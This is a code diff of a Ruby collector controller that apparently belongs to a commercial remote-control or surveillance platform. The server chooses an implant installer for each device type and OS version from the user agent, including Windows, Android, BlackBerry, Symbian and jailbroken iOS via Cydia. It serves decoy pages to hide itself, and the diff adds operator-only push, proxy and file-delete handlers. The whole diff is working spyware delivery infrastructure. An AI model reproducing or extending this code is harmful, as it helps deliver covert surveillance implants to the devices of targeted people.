@@ -20,7 +20,23 @@ class CollectorController < RESTController
   rescue Exception => e
     return decoy_page
   end
-  
+
+  def head
+    get
+  end
+
+  def push
+    # only the DB is authorized to send PUSH commands
+    unless from_db?(@request[:headers]) then
+      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send PUSH [#{@request[:uri]}] commands!!!"
+      return decoy_page
+    end
+
+    # it is a request to push to a NC element
+    content, content_type = NetworkController.push(@request[:uri], @request[:content])
+    return ok(content, {content_type: content_type})
+  end
+
   def put
     # only the DB is authorized to send PUT commands
     unless from_db?(@request[:headers]) then
@@ -28,14 +44,30 @@ class CollectorController < RESTController
       return decoy_page
     end
 
-    if @request[:uri].start_with?('/RCS-NC_')
-      # it is a request to push to a NC element
-      content, content_type = NetworkController.push(@request[:uri].split('_')[1], @request[:content])
-      return ok(content, {content_type: content_type})
-    end
-
     # this is a request to save a file in the public dir
     return http_put_file @request[:uri], @request[:content]
+  end
+
+  def delete
+    # only the DB is authorized to send DELETE commands
+    unless from_db?(@request[:headers]) then
+      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send DELETE [#{@request[:uri]}] commands!!!"
+      return decoy_page
+    end
+
+    return http_delete_file @request[:uri]
+  end
+
+  def proxy
+    # every request received are forwarded externally like a proxy
+
+    # only the DB is authorized to send PROXY commands
+    unless from_db?(@request[:headers]) then
+      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send PROXY [#{@request[:uri]}] commands!!!"
+      return decoy_page
+    end
+
+    return proxy_request(@request)
   end
 
   def post
@@ -45,19 +77,6 @@ class CollectorController < RESTController
     content, content_type, cookie = Protocol.parse peer, @request[:uri], @request[:cookie], @request[:content]
     return decoy_page if content.nil?
     return ok(content, {content_type: content_type, cookie: cookie})
-  end
-
-  def head
-    # we abuse this method to implement a proxy for the backend
-    # every request received are forwarded externally like a proxy
-
-    # only the DB is authorized to send HEAD commands
-    unless from_db?(@request[:headers]) then
-      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send HEAD [#{@request[:uri]}] commands!!!"
-      return decoy_page
-    end
-
-    return proxy_request(@request)
   end
 
   #
@@ -93,20 +112,14 @@ class CollectorController < RESTController
       end
     end
 
+    # cydia must have a not found instead of the decoy page
+    return not_found if os == 'cydia' and not File.file?(file_path)
+
     return decoy_page unless File.file?(file_path)
 
     content_type = MimeType.get(file_path)
 
     trace :info, "[#{@request[:peer]}][#{os}] serving #{file_path} (#{File.size(file_path)}) #{content_type}"
-
-    # trick for windows, eventmachine stream file does not work for file < 16Kb
-    return ok(File.binread(file_path), {:content_type => content_type}) if File.size(file_path) < 16384
-
-    # trick for windows...
-    # some phones don't like the streaming of the file, but accept it if written in one pass
-    if os == 'blackberry' || os == 'android'
-      return ok(File.binread(file_path), {:content_type => content_type})
-    end
 
     return stream_file(File.realdirpath(file_path))
   end
@@ -128,8 +141,6 @@ class CollectorController < RESTController
     xff = headers[:x_forwarded_for]
     # no header
     return nil if xff.nil?
-    # remove the x-forwarded-for: part
-    xff.slice!(0..16)
     # split the peers list
     peers = xff.split(',')
     trace :info, "[#{@request[:peer]}] has forwarded the connection for [#{peers.first}]"
@@ -156,9 +167,14 @@ class CollectorController < RESTController
 
       output = path + '/' + file
 
-      #TODO: when the file manager will be implemented
       # don't overwrite the file
-      #raise "File already exists" if File.exist?(output)
+      #raise "File already exists on this collector" if File.exist?(output)
+
+      if File.exist?(output)
+        trace :info, "Removing previous copy of: #{output}"
+        # remove the file if already present
+        FileUtils.rm_rf(output)
+      end
 
       trace :info, "Saving file: #{output}"
 
@@ -173,14 +189,33 @@ class CollectorController < RESTController
             f_path = File.join(File.dirname(output), File.basename(output, '.zip'), f.name)
             trace :info, "Creating #{f_path}"
             FileUtils.mkdir_p(File.dirname(f_path))
-            z.extract(f, f_path) unless File.exist?(f_path)
+            # overwrite the old one
+            FileUtils.rm_rf(f_path) if File.exist?(f_path)
+            z.extract(f, f_path)
           end
         end
       end
 
     rescue Exception => e
       trace :fatal, e.message
-      trace :fatal, e.backtrace.join("\n")
+
+      return server_error(e.message, {content_type: 'text/html'})
+    end
+
+    return ok('OK', {content_type: 'text/html'})
+  end
+
+  # delete a file in the /public directory
+  def http_delete_file(uri)
+    begin
+      path = File.join(Dir.pwd, PUBLIC_DIR, uri)
+
+      # remove both the directory and the zip file
+      FileUtils.rm_rf(path)
+      FileUtils.rm_rf(path + '.zip')
+
+    rescue Exception => e
+      trace :fatal, e.message
 
       return server_error(e.message, {content_type: 'text/html'})
     end
@@ -203,11 +238,43 @@ class CollectorController < RESTController
     return 'winmo', '.cab' if user_agent['Windows CE']
     # windows must be after winmo
     return 'windows', '.exe' if user_agent['Windows']
-    return 'blackberry', '.jad' if user_agent['BlackBerry']
-    return 'android', '.apk' if user_agent['Android']
+
+    if user_agent['BlackBerry']    
+      major = 4
+      minor = 5
+      ver_tuple = user_agent.scan(/Version\/(\d+)\.(\d+)/).flatten
+      major, minor = ver_tuple unless ver_tuple.empty?
+      if major.to_i >= 5
+        version = "5.0"
+      else
+        version = "4.5"
+      end
+              
+      trace :debug, "[#{@request[:peer]}] Blackberry version: #{version} -- #{major},#{minor}"
+      return 'blackberry', "_" + version + '.jad'
+    end
+  
+    if user_agent['Android']
+      major = 4
+      minor = 0
+      ver_tuple = user_agent.scan(/Android (\d+)\.(\d+)/).flatten
+      major, minor = ver_tuple unless ver_tuple.empty?
+      if major.to_i == 2
+        version = "v2"
+      else
+        version = "default"
+      end
+
+      trace :debug, "[#{@request[:peer]}] Android version: #{version} -- #{major},#{minor}"
+      return 'android', "." + version + '.apk'
+    end
+    
     # linux must be after android
     return 'linux', '.bin' if user_agent['Linux'] or user_agent['X11']
     return 'symbian', '.sisx' if user_agent['Symbian']
+
+    # special case for cydia requests
+    return 'cydia', '.deb' if user_agent['Telesphoreo']
 
     return 'unknown', ''
   end
